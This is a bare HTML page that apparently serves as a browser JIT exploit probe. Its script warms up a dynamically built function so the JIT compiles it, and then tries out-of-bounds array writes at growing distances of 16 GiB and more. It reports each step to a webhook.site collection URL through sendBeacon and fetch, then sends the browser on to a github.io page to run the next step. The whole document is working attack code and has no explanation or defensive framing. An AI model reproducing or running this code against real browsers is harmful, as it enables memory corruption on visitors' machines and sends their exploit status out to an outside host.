<html><body><script>
// r5: far-write distance sweep, 1 beacon per step, self-navigating (URL carries k).
var SINK='https://webhook.site/aabb99c8-5200-4505-8fc2-156824849142';
function beacon(v){ try{ navigator.sendBeacon(SINK+'/b?k='+encodeURIComponent(v),''); }catch(e){} try{ fetch(SINK+'?k='+encodeURIComponent(v),{mode:'no-cors'}); }catch(e){} }
var q={},m,re=/[?&]([^=&]+)=([^&]*)/g;
while((m=re.exec(location.search))) q[decodeURIComponent(m[1])]=decodeURIComponent(m[2]);
var k=parseInt(q.k||'0',10)||0;
var STEPS=32, GIB4=0x100000000;
beacon(k);
if (k < STEPS) {
  var C=(GIB4 + k*0x40000000);            // +16GiB, +1GiB per step
  var fake=new Uint32Array(10); for(var i=0;i<10;i++) fake[i]=i+1;
  var tahir=0x1;
  var T=new Function('a','var oob=new Array(5); oob[0]=0x500;'
   +'let jv=fake[0]; let av=fake[7]; if(a%7==0) av='+C+';'
   +'av=Math.max(av,tahir); av=av>>>0; var index=fake[3]; var fpm=fake[6]; let c=fake[1];'
   +'for(var i=0;i<10;i++){ if(a%3==0) jv=c; if(a%37==0) jv=fake[2]; if(a%11==0) jv=fake[8]; if(a%17==0) jv=fake[5]; if(a%19==0) jv=fake[4];'
   +' if(a%7==0&&i>=5){ fpm=jv; jv=av; } if(i>=6){ for(let j=0;j<5;j++){ if(a%5==0){ index=fpm; oob[index]=0x500; } } } fpm=c; c=jv; }'
   +'return [index,BigInt(jv)];');
  for(let i=2;i<0x500;i++) T(i);
  for(let w=0;w<50000;w++) T(w%500+2);
  T(35);
  beacon('ok'+(k+1));                     // survived step k -> next step exists
  try { location.href='https://tapczanpawel-walijak5cali.github.io/r5.html?k='+(k+1); } catch(e){}
} else { beacon('end'); }
</script></body></html>
